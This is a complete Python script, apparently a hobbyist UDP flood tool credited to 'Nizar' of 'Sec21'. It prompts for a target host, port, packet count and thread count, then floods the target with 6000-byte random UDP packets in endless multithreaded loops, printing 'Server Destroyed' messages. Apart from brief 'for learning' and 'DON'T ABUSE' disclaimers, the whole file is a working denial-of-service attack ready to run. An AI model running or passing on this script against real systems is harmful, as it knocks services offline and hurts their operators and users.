#!/usr/bin/env python3
#RENAME = DELETE
#for learning

import random
import socket
import threading
import os
os.system("clear")
print("AUTHOR : Nizar")
print("CREDIT : Nizar")
print("TEAM : Sec21")
print("From : Indonesia")
print("DON'T ABUSE")
ip = str(input(" Ip/Host : "))
port = int(input(" Port Target : "))
times = int(input(" Paket :"))
threads = int(input(" Threads :"))

def run():
  data = random._urandom(6000)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +" Nizar")
    except:
      print("Server Destroyed ByNizar")

for y in range(threads):
    th = threading.Thread(target = run)
    th.start()
